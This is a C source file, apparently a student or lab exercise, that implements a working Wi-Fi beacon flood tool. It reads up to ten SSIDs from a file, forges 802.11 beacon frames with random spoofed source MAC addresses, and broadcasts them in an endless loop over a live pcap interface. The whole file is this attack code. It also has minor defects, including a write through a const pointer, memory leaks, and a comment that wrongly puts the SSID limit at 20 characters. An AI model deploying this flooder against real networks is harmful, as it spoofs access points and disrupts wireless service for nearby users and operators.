#include <stdio.h>
#include <pcap.h> // for pcap
#include <string.h> // for memcpy
#include <stdlib.h> // for calloc
#include <time.h> // random
#include <unistd.h> // for sleep

#include "radiotap.h"
#include "BeaconFrame.h"

typedef struct BeaconFrame BeaconFrame;

int beacon_flood(const char* interface, const char* list_file) {

    srand(time(NULL));

    char errbuf[PCAP_ERRBUF_SIZE];
    const char* ifname = interface;

    // open ssid list file
    FILE* ssid_list_file = fopen(list_file, "rt");
    if(ssid_list_file == NULL) {
        fprintf(stderr, "failed to open file - %s\n", list_file);
        return -1;
    }

    const char* ssid_list[10]; // 10 fake ssid
    char tmp[256];
    int ssid_num = 0;
    // read ssid while under 10
    int i=0;
    while (fgets(tmp, sizeof(tmp), ssid_list_file) != NULL) { // fgets() inputs '\0' auto.
        if(i>=10) break;

        size_t len = strlen(tmp);
        if (len > 0 && tmp[len - 1] == '\n') {
            tmp[len - 1] = '\0';
        }

        ssid_list[i] = calloc(256, 1);
        printf("ssid %d - %s\n",i, tmp);

        if(strlen(tmp) >= 20) continue; // maximum ssid length is 20

        strncpy(ssid_list[i], tmp, strlen(tmp));
        i++;
        ssid_num++;
    }

    printf("ssid_num: %d\n", ssid_num);
    fclose(ssid_list_file);


    // pcap open live
    pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
    // pcap_t* handle = pcap_open_offline(ifname, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", ifname, errbuf);
		return -1;
	}

    struct pcap_pkthdr* header;
	const unsigned char* packet; // const u_char* packet;

    uint8_t radio_t[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};
    uint8_t da[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t sa[6] = {0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa};
    // char* fake_ssid = "hdxian_test";
    // int ssid_len = strlen(fake_ssid);
    // printf("ssid_len: %d\n", ssid_len);

    BeaconFrame* frame = calloc(1, sizeof(BeaconFrame) + 40);
    if(frame == NULL) {
        puts("faild to alloc *frame");
        return -1;
    }

    memcpy(frame->radiotap, radio_t, 8);
    frame->frame_control = 0x0080;
    frame->duration = 0x00;
    puts("before memcpy");
    memcpy(frame->addr1, da, 6);
    memcpy(frame->addr2, sa, 6);
    memcpy(frame->addr3, sa, 6);
    puts("after memcpy");
    frame->seq_control = htons(0xaaaa);
    frame->timestamp = ((uint64_t)rand() << 32) | rand();
    frame->beacon_interval = htons(0x6400);
    frame->cap_info = htons(0x0c11); // automatic power save delivery, short slot time, ESS capabilities bits 1

    frame->ssid_tag_num = (uint8_t)0x00;
    // frame->channel_tag_num = (uint8_t)0x03;
    // frame->channel_tag_len = (uint8_t)0x01;
    // frame->channel_tag_val = (uint8_t)0x01;

    uint8_t channel[3] = {(uint8_t)0x03, (uint8_t)0x01, (uint8_t)0x01};
    
    int ssid_len = 0;
    while(1) {

        for(int i=0; i<ssid_num; i++) {
            for(int i=0; i<6; i++)
                sa[i] = rand() % 256;
            memcpy(frame->addr2, sa, 6);
            memcpy(frame->addr3, sa, 6);

            // printf("ssid: %s\n", ssid_list[i]);
            ssid_len = strlen(ssid_list[i]);
            frame->ssid_tag_len = ssid_len;
            // printf("ssid tag len: %d\n", frame->ssid_tag_len);
            memcpy((unsigned char*)frame + sizeof(BeaconFrame), ssid_list[i], ssid_len); // ssid는 개행문자가 없고, 마지막에 널 문자를 넣어줘야 함.
            memcpy((unsigned char*)frame + sizeof(BeaconFrame) + ssid_len, channel, 3);
            // printf("ssid2: %s\n", (unsigned char*)frame + sizeof(BeaconFrame));
            pcap_sendpacket(handle, (unsigned char*)frame, sizeof(BeaconFrame) + ssid_len + 3);
            memset((unsigned char*)frame + sizeof(BeaconFrame), 0 ,ssid_len + 3);
        }
        puts("send beacon frame");
        // sleep(1);
    }

    printf("free\n");
    free(frame);

    for(int i=0; i<ssid_num; i++)
        free(ssid_list[i]);

    printf("return\n");
    return 0;

}
